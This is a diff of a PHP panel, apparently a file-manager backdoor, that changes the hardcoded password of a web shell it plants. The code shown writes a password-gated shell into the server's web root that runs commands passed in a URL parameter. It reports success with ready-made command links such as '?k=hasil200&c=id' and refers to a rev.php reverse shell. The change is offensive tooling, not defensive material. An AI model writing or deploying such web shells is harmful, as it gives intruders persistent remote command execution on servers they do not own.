@@ -2249,7 +2249,7 @@ if (isset($_POST['rs'])) {
     $rsAct = $_POST['rs'];
     header('Content-Type: text/html; charset=utf-8');
 $wsTpl = '<?php
-$p = \'Panel2025x\';
+$p = \'hasil200\';
 if (!isset($_GET[\'k\']) || $_GET[\'k\'] != $p) { echo \'ERR\'; exit; }
 $c = \'\';
 if (isset($_POST[\'c\'])) { $c = $_POST[\'c\']; }
@@ -2352,7 +2352,7 @@ echo \'P|\' . PHP_VERSION . \'|\' . (string)@ini_get(\'disable_functions\') . \'
         if ($okF === false) {
             $fullOut .= '<div style="padding:10px 16px;margin-bottom:8px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);color:#ef4444;border-radius:8px;font-size:13px;font-family:system-ui;">Web shell WRITE FAILED: ' . htmlspecialchars($fullFile) . '</div>';
         } else {
-            $fullOut .= '<div style="padding:10px 16px;margin-bottom:8px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:#22c55e;border-radius:8px;font-size:13px;font-family:system-ui;">Web Shell <strong>INSTALLED</strong> | Password: <strong>Panel2025x</strong><br>Use: <a href="' . htmlspecialchars($fullUrl . '?k=Panel2025x&c=id') . '" target="_blank" rel="noopener" style="color:#22c55e;word-break:break-all;">' . htmlspecialchars($fullUrl . '?k=Panel2025x&c=id') . '</a></div>';
+            $fullOut .= '<div style="padding:10px 16px;margin-bottom:8px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:#22c55e;border-radius:8px;font-size:13px;font-family:system-ui;">Web Shell <strong>INSTALLED</strong> | Password: <strong>hasil200</strong><br>Use: <a href="' . htmlspecialchars($fullUrl . '?k=hasil200&c=id') . '" target="_blank" rel="noopener" style="color:#22c55e;word-break:break-all;">' . htmlspecialchars($fullUrl . '?k=hasil200&c=id') . '</a></div>';
         }
         if ($ew) {
             $revFile = rtrim(detectRoot(), '/\\') . '/rev.php';
@@ -2385,7 +2385,7 @@ echo \'P|\' . PHP_VERSION . \'|\' . (string)@ini_get(\'disable_functions\') . \'
         $wsRel = trim(str_replace('\\', '/', dirname(isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '/filemanager.php')), '/');
         $wsUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? 'https' : 'http') . '://' . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '') . ($wsRel !== '' ? '/' . $wsRel : '') . '/' . $wsName;
         if ($okW === false) { die('<div style="padding:10px 16px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);color:#ef4444;border-radius:8px;font-size:13px;font-family:system-ui;">Write error: ' . htmlspecialchars($wsFile) . '</div>'); }
-        die('<div style="padding:10px 16px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:#22c55e;border-radius:8px;font-size:13px;font-family:system-ui;">Web Shell <strong>CREATED</strong> | File: <strong>' . htmlspecialchars($wsName) . '</strong> | Password: <strong>Panel2025x</strong><br>Use: <a href="' . htmlspecialchars($wsUrl . '?k=Panel2025x&c=id') . '" target="_blank" rel="noopener" style="color:#22c55e;word-break:break-all;">' . htmlspecialchars($wsUrl . '?k=Panel2025x&c=id') . '</a><br>The file is written to the panel folder; the URL is computed next to the panel. A random name is generated each time; works even on oldest PHP versions.</div>');
+        die('<div style="padding:10px 16px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:#22c55e;border-radius:8px;font-size:13px;font-family:system-ui;">Web Shell <strong>CREATED</strong> | File: <strong>' . htmlspecialchars($wsName) . '</strong> | Password: <strong>hasil200</strong><br>Use: <a href="' . htmlspecialchars($wsUrl . '?k=hasil200&c=id') . '" target="_blank" rel="noopener" style="color:#22c55e;word-break:break-all;">' . htmlspecialchars($wsUrl . '?k=hasil200&c=id') . '</a><br>The file is written to the panel folder; the URL is computed next to the panel. A random name is generated each time; works even on oldest PHP versions.</div>');
     }
     if ($rsAct === 'delete') {
         $roots = array(detectRoot(), dirname(__FILE__));
